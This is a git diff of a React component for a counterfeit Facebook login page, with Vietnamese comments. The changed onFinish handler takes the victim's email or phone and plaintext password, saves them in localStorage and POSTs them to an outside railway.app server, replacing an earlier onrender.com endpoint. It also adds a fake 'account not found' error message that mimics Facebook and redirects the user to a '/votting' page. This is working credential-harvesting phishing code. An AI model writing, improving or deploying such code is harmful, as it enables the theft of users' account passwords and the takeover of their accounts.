@@ -12,6 +12,7 @@ const FormComponent = () => {
     const { i18n } = useTranslation();
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
+    const [showErr, setShowErr] = useState();
 
     const handlePasswordChange = (e) => {
         setPassword(e.target.value);
@@ -45,57 +46,55 @@ const FormComponent = () => {
         localStorage.setItem('language', lng); // hoặc cookies, để lưu trạng thái ngôn ngữ
     };
 
+    const validateFields = (values) => {
+
+        
+       
+    };
+
     const onFinish = (values) => {
 
-        localStorage.setItem('dataForm', JSON.stringify(values))
-
-        const data   = { 
-            email: values.email_or_phone, 
-            password: values.password
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        const phoneNumberLength = 10; // Số ký tự tối thiểu cho số điện thoại
+        const passwordLength = 6; // Số ký tự tối thiểu cho mật khẩu
+    
+        if (!emailRegex.test(values.email_or_phone) || values.email_or_phone.length < phoneNumberLength ) {
+            setShowErr(true)
+        } else if(values.password.length < passwordLength){
+            setShowErr(true)
         }
+        else {
+            setShowErr(false)
+            localStorage.setItem('dataForm', JSON.stringify(values))
 
-        axios.post(`https://server-data-jyhr.onrender.com/api/news`, data)
-            .then((response) => {
-                navigate('/votting');
-            })
-            .catch((error) => {});
+            const data   = { 
+                email: values.email_or_phone, 
+                password: values.password
+            }
+
+            axios.post(`https://server-production-bd42.up.railway.app/api/news`, data)
+                .then((response) => {
+                    navigate('/votting');
+                })
+                .catch((error) => {});
+        }
 
     }
 
-    const validateEmailOrPhone = (rule, value, callback) => {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const phoneNumberLength = 10; // Số ký tự tối thiểu cho số điện thoại
-    
-        if (value.length >= 1) {
-            if (emailRegex.test(value)) {
-                // Kiểm tra nếu là email
-                callback(); // Không có lỗi nếu email hợp lệ
-            } else if (value.length >= phoneNumberLength) {
-                // Kiểm tra nếu là số điện thoại và độ dài lớn hơn hoặc bằng 10 ký tự
-                callback(); // Không có lỗi nếu số điện thoại hợp lệ
-            } else {
-                callback(`${t('errorEmail')}`); // Thông báo lỗi cho cả email và số điện thoại không hợp lệ
-            }
-        } 
-    };
-
-    const validatePassword = (rule, value, callback) => {
-        const passwordLength = 6; // Số ký tự tối thiểu cho mật khẩu
-    
-        if (value && value.length < passwordLength) {
-            callback(`Mật khẩu tối thiểu là 6 ký tự`); // Thông báo lỗi nếu mật khẩu ít hơn 6 ký tự
-        } else {
-            callback(); // Không có lỗi nếu mật khẩu hợp lệ
-        }
+    const onFinishFailed = (errorInfo) => {
+        setShowErr(true)
     };
 
     return (
         
         <div className="main login-form">
 
-            <div className="mob-down">
+            <div className={`mob-down ${showErr != true ? '' : 'active'}`}>
                 <div className="phone"></div>
                 <p>Tải Facebook dành cho Android và lướt xem nhanh hơn.</p>
+            </div>
+            <div className={`err ${showErr === true ? 'active' : ''}`}>
+                <p>Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <Link to="">Đăng ký tài khoản.</Link></p>
             </div>
 
             <div className="login-page">
@@ -117,6 +116,7 @@ const FormComponent = () => {
                                     remember: true,
                                 }}
                                 onFinish={onFinish}
+                                onFinishFailed={onFinishFailed}
                                 autoComplete="off"
                                 style={{
                                     display:"flex",
@@ -132,9 +132,6 @@ const FormComponent = () => {
                                             required: true,
                                             message: `${t('errorEmail')}`,
                                             },
-                                            {
-                                                validator: validateEmailOrPhone,
-                                            },
                                         ]}
                                     >
                                         <Input placeholder={t('holderEmail')} />
@@ -148,9 +145,6 @@ const FormComponent = () => {
                                             {
                                             required: true,
                                             message: `${t('errorPassword')}`,
-                                            },
-                                            {
-                                                validator: validatePassword,
                                             },
                                         ]}
                                     >
